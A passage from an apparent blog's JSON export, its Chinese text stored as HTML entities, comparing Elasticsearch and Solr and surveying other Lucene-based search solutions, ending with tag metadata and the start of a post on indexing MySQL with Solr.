&#x5F53;&#x7136;Elasticsearch&#x5E76;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;Lucene&#x8FD9;&#x4E48;&#x7B80;&#x5355;&#xFF0C;&#x5B83;&#x4E0D;&#x4F46;&#x5305;&#x62EC;&#x4E86;&#x5168;&#x6587;&#x641C;&#x7D22;&#x529F;&#x80FD;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4EE5;&#x4E0B;&#x5DE5;&#x4F5C;:1&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x5B9E;&#x65F6;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#xFF0C;&#x5E76;&#x5C06;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x90FD;&#x7F16;&#x5165;&#x7D22;&#x5F15;&#xFF0C;&#x4F7F;&#x5176;&#x53EF;&#x4EE5;&#x88AB;&#x641C;&#x7D22;&#x3002;2&#x3001;&#x5B9E;&#x65F6;&#x5206;&#x6790;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x3002;3&#x3001;&#x53EF;&#x4EE5;&#x6269;&#x5C55;&#x5230;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5904;&#x7406;PB&#x7EA7;&#x522B;&#x7684;&#x7ED3;&#x6784;&#x5316;&#x6216;&#x975E;&#x7ED3;&#x6784;&#x5316;&#x6570;&#x636E;&#x3002; &#x8FD9;&#x4E48;&#x591A;&#x7684;&#x529F;&#x80FD;&#x88AB;&#x96C6;&#x6210;&#x5230;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x5730;&#x901A;&#x8FC7;&#x5BA2;&#x6237;&#x7AEF;&#x6216;&#x8005;&#x4EFB;&#x4F55;&#x4F60;&#x559C;&#x6B22;&#x7684;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x4E0E;ES&#x7684;RESTful API&#x8FDB;&#x884C;&#x4EA4;&#x6D41;&#x3002;Elasticsearch&#x7684;&#x4E0A;&#x624B;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#x3002;&#x5B83;&#x9644;&#x5E26;&#x4E86;&#x5F88;&#x591A;&#x975E;&#x5E38;&#x5408;&#x7406;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x8FD9;&#x8BA9;&#x521D;&#x5B66;&#x8005;&#x5F88;&#x597D;&#x5730;&#x907F;&#x514D;&#x4E00;&#x4E0A;&#x624B;&#x5C31;&#x8981;&#x9762;&#x5BF9;&#x590D;&#x6742;&#x7684;&#x7406;&#x8BBA;&#xFF0C;&#x5B83;&#x5B89;&#x88C5;&#x597D;&#x4E86;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x7528;&#x5F88;&#x5C0F;&#x7684;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x5C31;&#x53EF;&#x4EE5;&#x53D8;&#x5F97;&#x5F88;&#x6709;&#x751F;&#x4EA7;&#x529B;&#x3002; &#x968F;&#x7740;&#x8D8A;&#x5B66;&#x8D8A;&#x6DF1;&#x5165;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;Elasticsearch&#x66F4;&#x591A;&#x9AD8;&#x7EA7;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6574;&#x4E2A;&#x5F15;&#x64CE;&#x53EF;&#x4EE5;&#x5F88;&#x7075;&#x6D3B;&#x5730;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x3002;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x8EAB;&#x9700;&#x6C42;&#x6765;&#x5B9A;&#x5236;&#x5C5E;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;Elasticsearch&#x3002; &#x4F7F;&#x7528;&#x6848;&#x4F8B;&#xFF1A;1&#x3001;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x8FDB;&#x884C;&#x5168;&#x6587;&#x641C;&#x505A;&#x5E76;&#x9AD8;&#x4EAE;&#x663E;&#x793A;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x4EE5;&#x53CA;&#x63D0;&#x4F9B;search-as-you-type&#x3001;did-you-mean&#x7B49;&#x641C;&#x7D22;&#x5EFA;&#x8BAE;&#x529F;&#x80FD;&#x3002;2&#x3001;&#x82F1;&#x56FD;&#x536B;&#x62A5;&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x5904;&#x7406;&#x8BBF;&#x5BA2;&#x65E5;&#x5FD7;&#xFF0C;&#x4EE5;&#x4FBF;&#x80FD;&#x5C06;&#x516C;&#x4F17;&#x5BF9;&#x4E0D;&#x540C;&#x6587;&#x7AE0;&#x7684;&#x53CD;&#x5E94;&#x5B9E;&#x65F6;&#x5730;&#x53CD;&#x9988;&#x7ED9;&#x5404;&#x4F4D;&#x7F16;&#x8F91;&#x3002;3&#x3001;StackOverflow&#x5C06;&#x5168;&#x6587;&#x641C;&#x7D22;&#x4E0E;&#x5730;&#x7406;&#x4F4D;&#x7F6E;&#x548C;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x7ED3;&#x5408;&#xFF0C;&#x4EE5;&#x63D0;&#x4F9B;more-like-this&#x76F8;&#x5173;&#x95EE;&#x9898;&#x7684;&#x5C55;&#x73B0;&#x3002;4&#x3001;GitHub&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x68C0;&#x7D22;&#x8D85;&#x8FC7;1300&#x4EBF;&#x884C;&#x4EE3;&#x7801;&#x3002;5&#x3001;&#x6BCF;&#x5929;&#xFF0C;Goldman Sachs&#x4F7F;&#x7528;&#x5B83;&#x6765;&#x5904;&#x7406;5TB&#x6570;&#x636E;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6295;&#x884C;&#x4F7F;&#x7528;&#x5B83;&#x6765;&#x5206;&#x6790;&#x80A1;&#x7968;&#x5E02;&#x573A;&#x7684;&#x53D8;&#x52A8;&#x3002;&#x4F46;&#x662F;Elasticsearch&#x5E76;&#x4E0D;&#x53EA;&#x662F;&#x9762;&#x5411;&#x5927;&#x578B;&#x4F01;&#x4E1A;&#x7684;&#xFF0C;&#x5B83;&#x8FD8;&#x5E2E;&#x52A9;&#x4E86;&#x5F88;&#x591A;&#x7C7B;&#x4F3C;DataDog&#x4EE5;&#x53CA;Klout&#x7684;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x8FDB;&#x884C;&#x4E86;&#x529F;&#x80FD;&#x7684;&#x6269;&#x5C55;&#x3002; &#x4F18;&#x70B9; Elasticsearch&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3002;&#x4E0D;&#x9700;&#x8981;&#x5176;&#x4ED6;&#x7EC4;&#x4EF6;&#xFF0C;&#x5206;&#x53D1;&#x662F;&#x5B9E;&#x65F6;&#x7684;&#xFF0C;&#x88AB;&#x53EB;&#x505A;&#x201D;Push replication&#x201D;&#x3002; Elasticsearch &#x5B8C;&#x5168;&#x652F;&#x6301; Apache Lucene &#x7684;&#x63A5;&#x8FD1;&#x5B9E;&#x65F6;&#x7684;&#x641C;&#x7D22;&#x3002; &#x5904;&#x7406;&#x591A;&#x79DF;&#x6237;&#xFF08;multitenancy&#xFF09;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x6B8A;&#x914D;&#x7F6E;&#xFF0C;&#x800C;Solr&#x5219;&#x9700;&#x8981;&#x66F4;&#x591A;&#x7684;&#x9AD8;&#x7EA7;&#x8BBE;&#x7F6E;&#x3002; Elasticsearch &#x91C7;&#x7528; Gateway &#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4F7F;&#x5F97;&#x5B8C;&#x5907;&#x4EFD;&#x66F4;&#x52A0;&#x7B80;&#x5355;&#x3002; &#x5404;&#x8282;&#x70B9;&#x7EC4;&#x6210;&#x5BF9;&#x7B49;&#x7684;&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#xFF0C;&#x67D0;&#x4E9B;&#x8282;&#x70B9;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x5176;&#x4ED6;&#x8282;&#x70B9;&#x4EE3;&#x66FF;&#x5176;&#x8FDB;&#x884C;&#x5DE5;&#x4F5C;&#x3002; &#x7F3A;&#x70B9; &#x53EA;&#x6709;&#x4E00;&#x540D;&#x5F00;&#x53D1;&#x8005;&#xFF08;&#x5F53;&#x524D;Elasticsearch GitHub&#x7EC4;&#x7EC7;&#x5DF2;&#x7ECF;&#x4E0D;&#x53EA;&#x5982;&#x6B64;&#xFF0C;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x76F8;&#x5F53;&#x6D3B;&#x8DC3;&#x7684;&#x7EF4;&#x62A4;&#x8005;&#xFF09; &#x8FD8;&#x4E0D;&#x591F;&#x81EA;&#x52A8;&#xFF08;&#x4E0D;&#x9002;&#x5408;&#x5F53;&#x524D;&#x65B0;&#x7684;Index Warmup API&#xFF09; Solr&#x7B80;&#x4ECB;Solr&#xFF08;&#x8BFB;&#x4F5C;&#x201C;solar&#x201D;&#xFF09;&#x662F;Apache Lucene&#x9879;&#x76EE;&#x7684;&#x5F00;&#x6E90;&#x4F01;&#x4E1A;&#x641C;&#x7D22;&#x5E73;&#x53F0;&#x3002;&#x5176;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x5305;&#x62EC;&#x5168;&#x6587;&#x68C0;&#x7D22;&#x3001;&#x547D;&#x4E2D;&#x6807;&#x793A;&#x3001;&#x5206;&#x9762;&#x641C;&#x7D22;&#x3001;&#x52A8;&#x6001;&#x805A;&#x7C7B;&#x3001;&#x6570;&#x636E;&#x5E93;&#x96C6;&#x6210;&#xFF0C;&#x4EE5;&#x53CA;&#x5BCC;&#x6587;&#x672C;&#xFF08;&#x5982;Word&#x3001;PDF&#xFF09;&#x7684;&#x5904;&#x7406;&#x3002;Solr&#x662F;&#x9AD8;&#x5EA6;&#x53EF;&#x6269;&#x5C55;&#x7684;&#xFF0C;&#x5E76;&#x63D0;&#x4F9B;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x7D22;&#x5F15;&#x590D;&#x5236;&#x3002;Solr&#x662F;&#x6700;&#x6D41;&#x884C;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;Solr4 &#x8FD8;&#x589E;&#x52A0;&#x4E86;NoSQL&#x652F;&#x6301;&#x3002;Solr&#x662F;&#x7528;Java&#x7F16;&#x5199;&#x3001;&#x8FD0;&#x884C;&#x5728;Servlet&#x5BB9;&#x5668;&#xFF08;&#x5982; Apache Tomcat &#x6216;Jetty&#xFF09;&#x7684;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x5168;&#x6587;&#x641C;&#x7D22;&#x670D;&#x52A1;&#x5668;&#x3002;Solr&#x91C7;&#x7528;&#x4E86; Lucene Java&#x641C;&#x7D22;&#x5E93;&#x4E3A;&#x6838;&#x5FC3;&#x7684;&#x5168;&#x6587;&#x7D22;&#x5F15;&#x548C;&#x641C;&#x7D22;&#xFF0C;&#x5E76;&#x5177;&#x6709;&#x7C7B;&#x4F3C;REST&#x7684;HTTP/XML&#x548C;JSON&#x7684;API&#x3002;Solr&#x5F3A;&#x5927;&#x7684;&#x5916;&#x90E8;&#x914D;&#x7F6E;&#x529F;&#x80FD;&#x4F7F;&#x5F97;&#x65E0;&#x9700;&#x8FDB;&#x884C;Java&#x7F16;&#x7801;&#xFF0C;&#x4FBF;&#x53EF;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x8C03;&#x6574;&#x4EE5;&#x9002;&#x5E94;&#x591A;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;Solr&#x6709;&#x4E00;&#x4E2A;&#x63D2;&#x4EF6;&#x67B6;&#x6784;&#xFF0C;&#x4EE5;&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x9AD8;&#x7EA7;&#x5B9A;&#x5236;&#x3002; &#x56E0;&#x4E3A;2010&#x5E74; Apache Lucene &#x548C; Apache Solr &#x9879;&#x76EE;&#x5408;&#x5E76;&#xFF0C;&#x4E24;&#x4E2A;&#x9879;&#x76EE;&#x662F;&#x7531;&#x540C;&#x4E00;&#x4E2A;Apache&#x8F6F;&#x4EF6;&#x57FA;&#x91D1;&#x4F1A;&#x5F00;&#x53D1;&#x56E2;&#x961F;&#x5236;&#x4F5C;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x63D0;&#x5230;&#x6280;&#x672F;&#x6216;&#x4EA7;&#x54C1;&#x65F6;&#xFF0C;Lucene/Solr&#x6216;Solr/Lucene&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002; &#x4F18;&#x70B9; Solr&#x6BD4;&#x8F83;&#x6210;&#x719F;&#x3001;&#x7A33;&#x5B9A;&#x3002; Solr&#x6709;&#x4E00;&#x4E2A;&#x66F4;&#x5927;&#x3001;&#x66F4;&#x6210;&#x719F;&#x7684;&#x7528;&#x6237;&#x3001;&#x5F00;&#x53D1;&#x548C;&#x8D21;&#x732E;&#x8005;&#x793E;&#x533A;&#x3002; &#x652F;&#x6301;&#x6DFB;&#x52A0;&#x591A;&#x79CD;&#x683C;&#x5F0F;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#xFF1A;HTML&#x3001;PDF&#x3001;&#x5FAE;&#x8F6F; Office &#x7CFB;&#x5217;&#x8F6F;&#x4EF6;&#x683C;&#x5F0F;&#x4EE5;&#x53CA; JSON&#x3001;XML&#x3001;CSV &#x7B49;&#x7EAF;&#x6587;&#x672C;&#x683C;&#x5F0F;&#x3002; &#x4E0D;&#x8003;&#x8651;&#x5EFA;&#x7D22;&#x5F15;&#x7684;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#xFF0C;&#x901F;&#x5EA6;&#x66F4;&#x5FEB;&#x3002; &#x7F3A;&#x70B9;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x65F6;&#xFF0C;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4E0B;&#x964D;&#xFF0C;&#x5B9E;&#x65F6;&#x7D22;&#x5F15;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4E0D;&#x9AD8;&#x3002; Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;&#x5F53;&#x5355;&#x7EAF;&#x7684;&#x5BF9;&#x5DF2;&#x6709;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#x65F6;&#xFF0C;Solr&#x66F4;&#x5FEB;&#x3002;&#x5F53;&#x5B9E;&#x65F6;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x65F6;, Solr&#x4F1A;&#x4EA7;&#x751F;io&#x963B;&#x585E;&#xFF0C;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x8F83;&#x5DEE;, Elasticsearch&#x5177;&#x6709;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x968F;&#x7740;&#x6570;&#x636E;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;Solr&#x7684;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4F1A;&#x53D8;&#x5F97;&#x66F4;&#x4F4E;&#xFF0C;&#x800C;Elasticsearch&#x5374;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x53D8;&#x5316;&#x3002;&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;Solr&#x7684;&#x67B6;&#x6784;&#x4E0D;&#x9002;&#x5408;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x7684;&#x5E94;&#x7528;&#x3002; &#x4E0B;&#x56FE;&#x4E3A;&#x5C06;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x4ECE;Solr&#x8F6C;&#x5230;Elasticsearch&#x4EE5;&#x540E;&#x7684;&#x5E73;&#x5747;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x6709;&#x4E86;50&#x500D;&#x7684;&#x63D0;&#x5347;&#x3002; Elasticsearch &#x4E0E; Solr &#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3; &#x4E8C;&#x8005;&#x5B89;&#x88C5;&#x90FD;&#x5F88;&#x7B80;&#x5355;&#xFF1B; Solr &#x5229;&#x7528; Zookeeper &#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x7BA1;&#x7406;&#xFF0C;&#x800C; Elasticsearch &#x81EA;&#x8EAB;&#x5E26;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x534F;&#x8C03;&#x7BA1;&#x7406;&#x529F;&#x80FD;; Solr &#x652F;&#x6301;&#x66F4;&#x591A;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C; Elasticsearch &#x4EC5;&#x652F;&#x6301;json&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF1B; Solr &#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;&#x529F;&#x80FD;&#x66F4;&#x591A;&#xFF0C;&#x800C; Elasticsearch &#x672C;&#x8EAB;&#x66F4;&#x6CE8;&#x91CD;&#x4E8E;&#x6838;&#x5FC3;&#x529F;&#x80FD;&#xFF0C;&#x9AD8;&#x7EA7;&#x529F;&#x80FD;&#x591A;&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x63D0;&#x4F9B;&#xFF1B; Solr &#x5728;&#x4F20;&#x7EDF;&#x7684;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x4E2D;&#x8868;&#x73B0;&#x597D;&#x4E8E; Elasticsearch&#xFF0C;&#x4F46;&#x5728;&#x5904;&#x7406;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x65F6;&#x6548;&#x7387;&#x660E;&#x663E;&#x4F4E;&#x4E8E; Elasticsearch&#x3002; Solr &#x662F;&#x4F20;&#x7EDF;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x7684;&#x6709;&#x529B;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4F46; Elasticsearch &#x66F4;&#x9002;&#x7528;&#x4E8E;&#x65B0;&#x5174;&#x7684;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x3002; &#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;Lucene&#x8BF4;&#x660E;&#xFF1A;Lucene &#x662F;&#x4E00;&#x4E2A; JAVA &#x641C;&#x7D22;&#x7C7B;&#x5E93;&#xFF0C;&#x5B83;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x5F00;&#x53D1;&#x5DE5;&#x4F5C;&#x3002;&#x4F18;&#x70B9;&#xFF1A;&#x6210;&#x719F;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x7684;&#x6210;&#x529F;&#x6848;&#x4F8B;&#x3002;apache &#x9876;&#x7EA7;&#x9879;&#x76EE;&#xFF0C;&#x6B63;&#x5728;&#x6301;&#x7EED;&#x5FEB;&#x901F;&#x7684;&#x8FDB;&#x6B65;&#x3002;&#x5E9E;&#x5927;&#x800C;&#x6D3B;&#x8DC3;&#x7684;&#x5F00;&#x53D1;&#x793E;&#x533A;&#xFF0C;&#x5927;&#x91CF;&#x7684;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x3002;&#x5B83;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x7C7B;&#x5E93;&#xFF0C;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5B9A;&#x5236;&#x548C;&#x4F18;&#x5316;&#x7A7A;&#x95F4;&#xFF1A;&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x5B9A;&#x5236;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x5E38;&#x89C1;&#x7684;&#x9700;&#x6C42;&#xFF1B;&#x7ECF;&#x8FC7;&#x4F18;&#x5316;&#xFF0C;&#x53EF;&#x4EE5;&#x652F;&#x6301; 10&#x4EBF;+ &#x91CF;&#x7EA7;&#x7684;&#x641C;&#x7D22;&#x3002;&#x7F3A;&#x70B9;&#xFF1A;&#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x5F00;&#x53D1;&#x5DE5;&#x4F5C;&#x3002;&#x6240;&#x6709;&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x7B49;&#x90FD;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#xFF1B;&#x975E;&#x5B9E;&#x65F6;&#xFF0C;&#x4ECE;&#x5EFA;&#x7D22;&#x5F15;&#x5230;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x4E2D;&#x95F4;&#x6709;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;&#xFF0C;&#x800C;&#x5F53;&#x524D;&#x7684;&#x201C;&#x8FD1;&#x5B9E;&#x65F6;&#x201D;(Lucene Near Real Time search)&#x641C;&#x7D22;&#x65B9;&#x6848;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x6709;&#x5F85;&#x8FDB;&#x4E00;&#x6B65;&#x5B8C;&#x5584; Katta&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene &#x7684;&#xFF0C;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x5177;&#x6709;&#x5BB9;&#x9519;&#x529F;&#x80FD;&#xFF0C;&#x51C6;&#x5B9E;&#x65F6;&#x7684;&#x641C;&#x7D22;&#x65B9;&#x6848;&#x3002;&#x4F18;&#x70B9;&#xFF1A;&#x5F00;&#x7BB1;&#x5373;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0E; Hadoop &#x914D;&#x5408;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#x3002;&#x5177;&#x5907;&#x6269;&#x5C55;&#x548C;&#x5BB9;&#x9519;&#x673A;&#x5236;&#x3002;&#x7F3A;&#x70B9;&#xFF1A;&#x53EA;&#x662F;&#x641C;&#x7D22;&#x65B9;&#x6848;&#xFF0C;&#x5EFA;&#x7D22;&#x5F15;&#x90E8;&#x5206;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x641C;&#x7D22;&#x529F;&#x80FD;&#x4E0A;&#xFF0C;&#x53EA;&#x5B9E;&#x73B0;&#x4E86;&#x6700;&#x57FA;&#x672C;&#x7684;&#x9700;&#x6C42;&#x3002;&#x6210;&#x529F;&#x6848;&#x4F8B;&#x8F83;&#x5C11;&#xFF0C;&#x9879;&#x76EE;&#x7684;&#x6210;&#x719F;&#x5EA6;&#x7A0D;&#x5FAE;&#x5DEE;&#x4E00;&#x4E9B;&#x3002;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x9700;&#x6C42;&#xFF0C;&#x5B9A;&#x5236;&#x7684;&#x96BE;&#x5EA6;&#x4F1A;&#x6BD4;&#x8F83;&#x5927;&#x3002; Hadoop contrib/index&#x8BF4;&#x660E;&#xFF1A;Map/Reduce &#x6A21;&#x5F0F;&#x7684;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5EFA;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#xFF0C;&#x53EF;&#x4EE5;&#x8DDF; Katta &#x914D;&#x5408;&#x4F7F;&#x7528;&#x3002;&#x4F18;&#x70B9;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x5177;&#x5907;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3002;&#x7F3A;&#x70B9;&#xFF1A;&#x53EA;&#x662F;&#x5EFA;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x641C;&#x7D22;&#x5B9E;&#x73B0;&#x3002;&#x5DE5;&#x4F5C;&#x5728;&#x6279;&#x5904;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5BF9;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x7684;&#x652F;&#x6301;&#x4E0D;&#x4F73;&#x3002; LinkedIn &#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene &#x7684;&#x4E00;&#x7CFB;&#x5217;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x5305;&#x62EC; &#x51C6;&#x5B9E;&#x65F6;&#x641C;&#x7D22; zoie &#xFF0C;facet &#x641C;&#x7D22;&#x5B9E;&#x73B0; bobo &#xFF0C;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7B97;&#x6CD5; decomposer &#xFF0C;&#x6458;&#x8981;&#x5B58;&#x50A8;&#x5E93; krati &#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6A21;&#x5F0F;&#x5305;&#x88C5; sensei &#x7B49;&#x7B49;&#x4F18;&#x70B9;&#xFF1A;&#x7ECF;&#x8FC7;&#x9A8C;&#x8BC1;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#x5B9E;&#x73B0;&#x7F3A;&#x70B9;&#xFF1A;&#x4E0E; linkedin &#x516C;&#x53F8;&#x7684;&#x8054;&#x7CFB;&#x592A;&#x7D27;&#x5BC6;&#xFF0C;&#x53EF;&#x5B9A;&#x5236;&#x6027;&#x6BD4;&#x8F83;&#x5DEE; Lucandra&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene&#xFF0C;&#x7D22;&#x5F15;&#x5B58;&#x5728; cassandra &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F18;&#x70B9;&#xFF1A;&#x53C2;&#x8003; cassandra &#x7684;&#x4F18;&#x70B9;&#x7F3A;&#x70B9;&#xFF1A;&#x53C2;&#x8003; cassandra &#x7684;&#x7F3A;&#x70B9;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x8FD9;&#x53EA;&#x662F;&#x4E00;&#x4E2A; demo&#xFF0C;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x5927;&#x91CF;&#x9A8C;&#x8BC1; HBasene&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene&#xFF0C;&#x7D22;&#x5F15;&#x5B58;&#x5728; HBase &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F18;&#x70B9;&#xFF1A;&#x53C2;&#x8003; HBase &#x7684;&#x4F18;&#x70B9;&#x7F3A;&#x70B9;&#xFF1A;&#x53C2;&#x8003; HBase &#x7684;&#x7F3A;&#x70B9;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5728;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;lucene terms &#x662F;&#x5B58;&#x6210;&#x884C;&#xFF0C;&#x4F46;&#x6BCF;&#x4E2A; term &#x5BF9;&#x5E94;&#x7684; posting lists &#x662F;&#x4EE5;&#x5217;&#x7684;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#x7684;&#x3002;&#x968F;&#x7740;&#x5355;&#x4E2A; term &#x7684; posting lists &#x7684;&#x589E;&#x5927;&#xFF0C;&#x67E5;&#x8BE2;&#x65F6;&#x7684;&#x901F;&#x5EA6;&#x53D7;&#x5230;&#x7684;&#x5F71;&#x54CD;&#x4F1A;&#x975E;&#x5E38;&#x5927;","raw":null,"content":null,"categories":[{"name":"搜索","slug":"搜索","permalink":"http://www.wangxin123.com/categories/搜索/"}],"tags":[{"name":"ES","slug":"ES","permalink":"http://www.wangxin123.com/tags/ES/"},{"name":"solr","slug":"solr","permalink":"http://www.wangxin123.com/tags/solr/"}]},{"title":"使用Solr索引MySQL数据","slug":"使用Solr索引MySQL数据","date":"2016-07-03T13:18:00.000Z","updated":"2017-02-21T08:42:19.965Z","comments":true,"path":"2016/07/03/使用Solr索引MySQL数据/","link":"","permalink":"http://www.wangxin123.com/2016/07/03/使用Solr索引MySQL数据/","excerpt":"&#x73AF;&#x5883;&#x642D;&#x5EFA;1&#x3001;&#x5230;apache&#x4E0B;&